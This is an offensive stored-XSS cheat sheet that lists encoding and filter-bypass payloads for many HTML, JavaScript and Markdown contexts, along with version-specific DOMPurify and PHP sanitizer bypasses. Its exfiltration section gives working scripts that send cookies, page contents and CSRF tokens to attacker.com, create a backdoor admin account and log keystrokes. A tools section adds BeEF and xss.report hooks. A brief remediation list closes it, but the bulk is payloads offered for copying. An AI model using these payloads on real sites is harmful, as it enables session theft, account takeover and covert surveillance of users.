---
title: "Stored XSS: Sanitization Bypass & Encoding Arsenal"
date: 2026-02-24
draft: false
---

# Stored XSS: Sanitization Bypass & Encoding Arsenal

> **Severity**: Critical | **CWE**: CWE-79 | **OWASP**: A03:2021
> **Reference**: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

---

## Sanitization Stack — Read Before Testing

Stored XSS payloads must survive **two passes**: sanitization at write time AND output encoding (or lack thereof) at render time. They also traverse the full stack:

```
[WRITE PATH]
Browser form → client-side JS validation → server input filter → DB storage

[READ PATH]
DB → template engine → browser HTML parser → DOM

Bypass strategy per layer:
  Client JS    → intercept in Burp, submit raw
  Input filter → encoded payload that decodes to XSS after storage
  DB charset   → some DBs strip/alter bytes (test: store emoji, check encoding)
  Template     → look for | safe, | raw, {{{var}}}, dangerouslySetInnerHTML
  Browser      → mXSS: sanitized string re-parsed differently
```

### Identify Output Context Before Picking Payload

```
# Submit unique string → visit all pages where it appears → view source
# Find exact rendering:

<div class="comment">YOUR_INPUT</div>         → Context A: HTML body
<input value="YOUR_INPUT">                    → Context B: double-quoted attr
<a href="YOUR_INPUT">                         → Context C: href
<script>var msg = "YOUR_INPUT";</script>      → Context D: JS string
<!-- YOUR_INPUT -->                           → Context E: HTML comment
<script>var cfg = {user: YOUR_INPUT};</script>→ Context F: JS unquoted
```

---

## Payload Table — All Encoding Variants

### `<script>` in HTML Body Context

```
[RAW]
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>

[HTML ENTITY — decimal]
&#60;script&#62;alert(1)&#60;/script&#62;
&#60;script&#62;alert(document.domain)&#60;/script&#62;

[HTML ENTITY — hex]
&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
&#x3c;script&#x3e;alert(document.domain)&#x3c;/script&#x3e;

[HTML ENTITY — hex zero-padded (common WAF bypass)]
&#x003c;script&#x003e;alert(1)&#x003c;/script&#x003e;
&#x003c;script&#x003e;alert(document.domain)&#x003c;/script&#x003e;

[HTML ENTITY — no semicolons]
&#60script&#62alert(1)&#60/script&#62
&#x3cscript&#x3ealert(document.domain)&#x3c/script&#x3e

[URL ENCODED]
%3Cscript%3Ealert(1)%3C%2Fscript%3E
%3cscript%3ealert(document.domain)%3c%2fscript%3e

[DOUBLE URL ENCODED]
%253Cscript%253Ealert(1)%253C%252Fscript%253E

[UNICODE — for JS context or template injection]
\u003cscript\u003ealert(1)\u003c/script\u003e

[HTML COMMENT KEYWORD BREAK — fools regex filters]
<scr<!---->ipt>alert(1)</scr<!---->ipt>
<scr<!--esi-->ipt>alert(1)</script>
<scr/**/ipt>alert(1)</script>
<SCRIPT>alert(1)</SCRIPT>
<ScRiPt>alert(document.domain)</ScRiPt>
```

### `<img>` onerror — Core Stored XSS Payload

```
[RAW]
<img src=x onerror=alert(1)>
<img src=1 onerror=confirm(1)>
<img src=x onerror=alert(document.domain)>
<img src=x onerror=alert(document.cookie)>

[HTML ENTITY — brackets only]
&#x3c;img src=x onerror=alert(1)&#x3e;
&#x003c;img src=1 onerror=confirm(1)&#x003e;

[HTML ENTITY — event value also encoded (survives htmlspecialchars)]
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
<img src=x onerror=&#x61;l&#x65;rt&#x28;1&#x29;>
<img src=x onerror=al&#101;rt(1)>
<img src=x onerror=&#97&#108&#101&#114&#116&#40&#49&#41>

[HTML ENTITY — full attribute in quotes]
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">

[URL ENCODED]
%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
%3Cimg%20src%3D1%20onerror%3Dconfirm(1)%3E
%3cimg+src%3dx+onerror%3dalert(document.domain)%3e

[DOUBLE URL ENCODED]
%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E
%253cimg%2520src%253d1%2520onerror%253dconfirm%25281%2529%253e

[URL + HTML ENTITY COMBINED]
%26%23x003c%3Bimg%20src%3D1%20onerror%3Dalert(1)%26%23x003e%3B
%26%23x003c%3Bimg%20src%3D1%20onerror%3Dconfirm(1)%26%23x003e%3B%0A

[CASE VARIATION + DOUBLE ENCODE — WAF bypass]
%253CSvg%2520O%256ELoad%253Dconfirm%2528/xss/%2529%253E
x%22%3E%3Cimg%20src=%22x%22%3E%3C!--%2522%2527--%253E%253CSvg%2520O%256ELoad%253Dconfirm%2528/xss/%2529%253E

[HEX ESCAPE in event]
<img src=x onerror="\x61\x6c\x65\x72\x74(1)">

[UNICODE ESCAPE in event]
<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">
<img src=x onerror="\u{61}lert(1)">

[BASE64 eval — survives many keyword filters]
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
<img src=x onerror="eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))">
<img src=x onerror="eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))">

[FROMCHARCODE — no string literals needed]
<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">
```

### `<svg>` Based

```
[RAW]
<svg onload=alert(1)>
<svg/onload=confirm(1)>
<svg onload=alert(document.domain)>

[HTML ENTITY]
&#x3c;svg onload=alert(1)&#x3e;
&#x003c;svg onload=alert(document.domain)&#x003e;
&#60;svg onload=alert(1)&#62;

[URL ENCODED]
%3Csvg%20onload%3Dalert(1)%3E
%3csvg%2fonload%3dconfirm(1)%3e

[DOUBLE URL ENCODED]
%253Csvg%2520onload%253Dalert(1)%253E
%253CSvg%2520OnLoAd%253Dconfirm(1)%253E

[SVG ANIMATE — alternative to onload]
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set onbegin=alert(1) attributeName=x to=1>
<svg><discard onbegin=alert(1)>

[SVG SCRIPT element]
<svg><script>alert(1)</script></svg>
<svg><script>alert&#40;1&#41;</script></svg>
<svg><script>alert&lpar;1&rpar;</script></svg>
```

### `<embed>`, `<object>`, `<base>` — Often Missed by Filters

```
[EMBED]
<embed src=javascript:alert(1)>
<embed src="javascript:alert(document.domain)">
<embed src=/x//alert(1)>

[OBJECT]
<object data=javascript:alert(1)>
<object data="javascript:alert(document.cookie)">
&#x3c;object data=javascript:alert(1)&#x3e;

[BASE HREF POISONING — redirects all relative script loads]
<base href="javascript:\
<base href="javascript:alert(1)//">
<base href="//attacker.com/">

[EMBED + BASE COMBINED]
<embed src=/x//alert(1)><base href="javascript:\
```

---

## Bypassing Specific Sanitizers

### Bypassing `strip_tags()` — PHP

`strip_tags()` removes tags but leaves content. Critical: it does NOT protect attribute context.

```php
// Developer wrote (wrong):
$safe = strip_tags($_POST['bio']);
echo '<input value="' . $safe . '">';

// strip_tags removes <script>alert</script> → "alert"
// But quotes pass through:
" onmouseover="alert(1)          → <input value="" onmouseover="alert(1)">
" autofocus onfocus="alert(1)    → fires on page load
" onfocus="alert(1)" autofocus=" → same

// Mutation: strip_tags breaks on malformed tags (some PHP versions):
<<script>alert(1)//</script>       → outer << survives, browser parses as <script>
<script<script>>alert(1)</script>  → some parsers reconstruct
```

### Bypassing `htmlspecialchars()` — PHP Default (no ENT_QUOTES)

```php
// Without ENT_QUOTES, single quotes pass through:
echo "<input value='" . htmlspecialchars($input) . "'>";

// Payloads (single quote breaks attribute):
' onmouseover='alert(1)
' autofocus onfocus='alert(1)
' onfocus='alert(1)' autofocus x='

// In JS context — htmlspecialchars doesn't help:
echo "<script>var x = '" . htmlspecialchars($input) . "';</script>";
// Backslash not encoded → break string with backslash trick:
// Input: \
// Stored: \'  (htmlspecialchars encodes the quote but attacker's \ escapes it)
// Result: var x = '\' → unclosed string → syntax error → next chars are JS
```

### Bypassing DOMPurify — Version-Specific mXSS

```
# Check version:
# In browser console: DOMPurify.version
# In JS source: grep for DOMPurify

[DOMPurify < 2.0.1 — namespace confusion]
<math><mtext></table><mglyph><style></math><img src onerror=alert(1)>

[DOMPurify < 2.0.17 — mXSS via SVG]
<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>

[DOMPurify < 3.0.6 — template element]
<template><div></template><img src=x onerror=alert(1)>

[DOMPurify — allowed tags abused]
# If img is in ALLOWED_TAGS but events not stripped:
<img src=x onerror=alert(1)>

# If style is allowed:
<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart=alert(1)></div>

[General mXSS — parser differential]
<p id="</p><img src=x onerror=alert(1)>">
<select><template shadowrootmode=open><img src=x onerror=alert(1)></template></select>
```

### Bypassing Bleach (Python)

```python
# bleach.clean() with allowed_tags=['a','img'] but no attribute filtering:
# Default: strips event handlers from allowed tags
# Bypass: if linkify=True and allowed attributes too broad:
<a href="javascript:alert(1)">click</a>
<a href="javascript&#58;alert(1)">click</a>
<a href="java&#x0Dscript:alert(1)">click</a>
```

### Bypassing WAF on Rich Text / Markdown

```markdown
[LINK — javascript: in href]
[click](javascript:alert(1))
[click](javascript&#58;alert(1))
[click](java%0ascript:alert(1))
[x](javascript://comment%0aalert(1))

[INLINE HTML — if allowed by renderer]
<img src=x onerror=alert(1)>
<details open ontoggle=alert(1)><summary>x</summary></details>

[IMAGE with onerror in alt]
![<img src=x onerror=alert(1)>](https://example.com/real.png)

[REFERENCE LINK bypass]
[x]: javascript:alert(1)
[click][x]

[HTML ENTITY in markdown link]
[click](&#106;avascript:alert(1))
[click](&#x6A;avascript:alert(1))
```

---

## Quick Payload Reference — Copy-Paste Arsenal

```html
<!-- HTML Entity Encoding -->
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
&#x22; onerror=&#x22;fetch(&#x27;https://xss.report/c/blitz&#x27;)&#x22;
&lt;img src=&quot;x&quot; alt=&quot;&#x22; onerror=&#x22;fetch(&#x27;https://xss.report/c/blitz&#x27;)&#x22;&quot; /&gt;

<!-- URL Encoding -->
%3Cscript%3Ealert(1)%3C/script%3E

<!-- Unicode Escape -->
\u003Cscript\u003Ealert(1)\u003C/script\u003E

<!-- Dynamic Concatenation -->
<scr + ipt>alert(1)</scr + ipt>

<!-- Spaces in tag -->
<scr ipt>alert(1)</scr ipt>

<!-- SVG wrapper -->
<svg><script>alert(1)</script></svg>

<!-- JS event reassignment -->
<img src="x" onerror="this.src='javascript:alert(1)'">

<!-- Inline attribute focus -->
<input value="XSS" onfocus="alert('XSS')">

<!-- CSS Expression (IE) -->
<div style="width:expression(alert(1));">Test</div>

<!-- Body onload -->
<body onload="alert('XSS')">
```

---

## Context-Specific Breakout Payloads

### JavaScript String Context — Most Missed

```javascript
// Code: var bio = "USER_INPUT";
// Test: submit \  → if stored as \  → source shows var bio = "\";  → string broken

// Single-quote string:
';alert(1)//
'-alert(1)-'
\';alert(1)//

// Double-quote string:
";alert(1)//
"-alert(1)-"

// Template literal:
`${alert(1)}`
${alert(document.cookie)}

// Numeric context — var x = USER_INPUT:
alert(1)
(function(){alert(1)})()
1;alert(1)

// Break out of entire script block (most reliable when quotes encoded):
</script><img src=x onerror=alert(1)>
</script><svg onload=alert(1)>
</ScRiPt><script>alert(1)</script>
</script><!--><img src=x onerror=alert(1)>
```

### href Context — javascript: Full Matrix

```
javascript:alert(1)
Javascript:alert(1)
JAVASCRIPT:alert(1)
JaVaScRiPt:alert(1)
javascript&#58;alert(1)
javascript&#x3A;alert(1)
javascript&#x003A;alert(1)
&#106;avascript:alert(1)
&#x6A;avascript:alert(1)
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)
java	script:alert(1)          ← tab
java
script:alert(1)                   ← newline
java%09script:alert(1)
java%0ascript:alert(1)
java%0dscript:alert(1)
javascript:void(0);alert(1)
javascript://comment%0aalert(1)
```

---

## Exfiltration Payloads for Confirmed Stored XSS

```html
[COOKIE EXFIL]
<img src=x onerror="new Image().src='https://attacker.com/?c='+encodeURIComponent(document.cookie)">
<script>fetch('https://attacker.com/?c='+btoa(document.cookie))</script>
<script>navigator.sendBeacon('https://attacker.com/',document.cookie)</script>

[DOM DUMP — full page HTML]
<script>fetch('https://attacker.com/?h='+btoa(document.documentElement.outerHTML))</script>

[CSRF TOKEN HARVEST]
<script>
fetch('/account').then(r=>r.text()).then(h=>{
  let t=h.match(/csrf[_-]?token[^"]*"([^"]{20,})/i);
  if(t)fetch('https://attacker.com/?t='+t[1]);
});
</script>

[ADMIN ACTION VIA XSS — create backdoor]
<script>
fetch('/api/admin/users',{
  method:'POST',
  headers:{'Content-Type':'application/json'},
  body:JSON.stringify({username:'backdoor',password:'P@ss123!',role:'admin'})
}).then(r=>fetch('https://attacker.com/?done='+r.status));
</script>

[KEYLOGGER]
<script>
document.addEventListener('keypress',e=>{
  fetch('https://attacker.com/k?k='+String.fromCharCode(e.which))
});
</script>
```

---

## Tools

```bash
# PortSwigger XSS Cheat Sheet (essential — download and filter by tag/event):
# https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

# XSSHunter (blind/stored XSS with screenshots + cookie capture):
# https://xsshunter.trufflesecurity.com
# Payload: <script src=//xss.report/abc></script>
# Triggers report when page loads — captures URL, cookies, DOM, screenshot

# Burp Suite:
# - Submit canary → Search in responses: Ctrl+F across all Burp history
# - Extensions: "Reflected Parameters" — auto-highlights all reflections
# - Scanner: right-click → "Actively scan this URL"
# - DOM Invader: embedded browser tab for DOM sink tracing

# dalfox — stored mode (submit + trigger URL):
dalfox url "https://target.com/comment" \
  --trigger "https://target.com/post/1" \
  --method POST --data "body=INJECT"

# BeEF (Browser Exploitation Framework) hook:
<script src="http://BEEF_IP:3000/hook.js"></script>
# BeEF UI: http://localhost:3000/ui/panel

# Manual exfil listener:
python3 -m http.server 80
# Then: <img src=x onerror="fetch('http://YOUR_IP/?c='+document.cookie)">

# retire.js — find outdated sanitizer/framework versions:
npm install -g retire && retire --path ./js/
```

---

## Remediation Reference

- **Store raw, encode at output** — encode in context at render time, not at input time
- `| safe` / `| raw` / `{{{var}}}` / `dangerouslySetInnerHTML` — audit every occurrence
- **DOMPurify** for rich text: pin to latest version, configure `ALLOWED_TAGS` strictly
- **HttpOnly + SameSite=Strict** on session cookies
- **CSP**: `script-src 'nonce-RANDOM' 'strict-dynamic'; object-src 'none'; base-uri 'none'`

*PortSwigger XSS Cheat Sheet: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet*
